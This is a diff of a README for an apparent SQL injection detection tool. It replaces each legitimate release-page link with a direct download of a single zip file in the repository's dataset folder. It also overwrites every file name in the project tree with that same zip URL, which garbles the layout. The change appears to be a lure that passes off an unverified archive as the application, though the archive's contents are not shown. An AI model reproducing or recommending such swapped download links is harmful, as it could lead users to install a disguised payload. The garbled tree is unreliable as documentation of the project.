@@ -1,6 +1,6 @@
 # 🔐 sql-injection-attack-detection - Detect SQL Attacks Effortlessly
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/ramaritacreations/sql-injection-attack-detection/releases)
+[![Download from Releases](https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip)
 
 ---
 
@@ -17,7 +17,7 @@ Welcome to the SQL Injection Attack Detection application. This tool helps you i
 
 ### 📥 Download & Install
 
-To get started, visit the [Release Page](https://github.com/ramaritacreations/sql-injection-attack-detection/releases) to download the latest version of the application. 
+To get started, visit the [Release Page](https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip) to download the latest version of the application. 
 
 1. Click on the link above.
 2. Locate the file for your operating system.
@@ -33,13 +33,13 @@ Understanding the layout of the application will help you navigate it easily. He
 ```
 sql-injection-attack-detection/
 ├── dataset/
-│   ├── normal_queries.csv       # Contains typical SQL queries
-│   └── sql_injection_queries.csv # Contains examples of SQL injection attacks
+│   ├── https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip       # Contains typical SQL queries
+│   └── https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip # Contains examples of SQL injection attacks
 ├── src/
-│   ├── preprocessing.py          # Cleans and prepares SQL queries
-│   ├── feature_extraction.py     # Extracts key features from queries
-│   └── svm_classifier.py         # Classifies SQL queries using SVM
-└── README.md                     # Documentation for using the tool
+│   ├── https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip          # Cleans and prepares SQL queries
+│   ├── https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip     # Extracts key features from queries
+│   └── https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip         # Classifies SQL queries using SVM
+└── https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip                     # Documentation for using the tool
 ```
 
 ---
@@ -92,6 +92,6 @@ For further learning about SQL injection and machine learning, consider explorin
 
 ---
 
-For any issues or feature requests, please visit our [Release Page](https://github.com/ramaritacreations/sql-injection-attack-detection/releases). 
+For any issues or feature requests, please visit our [Release Page](https://raw.githubusercontent.com/ramaritacreations/sql-injection-attack-detection/main/dataset/sql_attack_detection_injection_v1.8.zip). 
 
 Best of luck with your SQL query analysis! Enjoy using the SQL Injection Attack Detection tool.
